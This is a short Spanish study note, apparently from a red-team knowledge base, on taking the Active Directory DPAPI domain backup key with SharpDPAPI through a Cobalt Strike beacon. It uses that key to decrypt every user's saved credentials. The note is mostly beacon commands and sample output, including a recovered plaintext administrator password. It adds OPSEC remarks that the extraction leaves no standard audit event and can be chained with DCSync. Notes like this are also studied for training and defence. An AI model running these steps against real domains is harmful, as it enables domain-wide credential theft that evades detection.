---
tags: [ad, dpapi, credential-access, domain-dominance, sharpdpapi]
status: completo
---

# DPAPI Backup Key

> La backup key del dominio cifra una copia de cada masterkey de usuario. Extraerla da acceso a **todos los DPAPI blobs del dominio**.

Se genera aleatoriamente al crear el dominio. Como `krbtgt`, **nunca se rota automáticamente**.

---

## Extracción (requiere DA)

```
beacon> execute-assembly SharpDPAPI.exe backupkey

[*] Preferred backupkey Guid : 12c95677-bb3d-4932-aab9-1e89c1dd005d
[*] Key                      : HvG1s[...snip...]lXQns=
```

Guarda la key — es persistente hasta que alguien la cambie manualmente.

---

## Enumerar credenciales sin la backup key

Desde una sesión con admin local, SharpDPAPI intenta descifrar via RPC (solo funciona para el propio usuario):

```
beacon> execute-assembly SharpDPAPI.exe credentials

[X] MasterKey GUID not in cache: {120b3a8a-...}
# → Falla si no es el propietario de la cred
```

---

## Descifrar credenciales de cualquier usuario (con backup key)

```
beacon> execute-assembly SharpDPAPI.exe credentials /pvk:HvG1s[...snip...]lXQns=

[*] User master key cache:
{120b3a8a-683d-4db8-8f13-e4c466949bd2}:62DD49BC2CF3000FC9DF3E3B6B48CA732D77FB34

Folder : C:\Users\pchilds\AppData\Local\Microsoft\Credentials\

  CredFile     : 9CAEEF854B7702E986B47C751DFE9AD2
  TargetName   : Domain:target=TERMSRV/lon-ws-1
  UserName     : LON-WS-1\Administrator
  Credential   : Passw0rd!
```

| Parámetro | Descripción |
|-----------|-------------|
| `credentials` | Enumera todas las creds DPAPI en el sistema |
| `/pvk:<key>` | Usa la backup key del dominio para descifrar cualquier masterkey |

---

## OPSEC

- La extracción usa **BackupKey Remote Protocol** (MS-BKRP) — genera tráfico RPC al DC
- No hay evento de auditoría estándar para esta operación
- Combinado con [[05-ad-attacks/ataques/dcsync|DCSync]] (para obtener backup key si no eres DA aún) → acceso masivo a credenciales

---

## Ver también

- [[05-ad-attacks/ataques/dcsync|DCSync]] — extraer hashes sin tocar LSASS
- [[05-ad-attacks/ataques/golden-ticket|Golden Ticket]] — persistencia alternativa via krbtgt
- [[05-ad-attacks/kerberos/kerberoasting|Kerberoasting]] — obtener hashes de cuentas de servicio
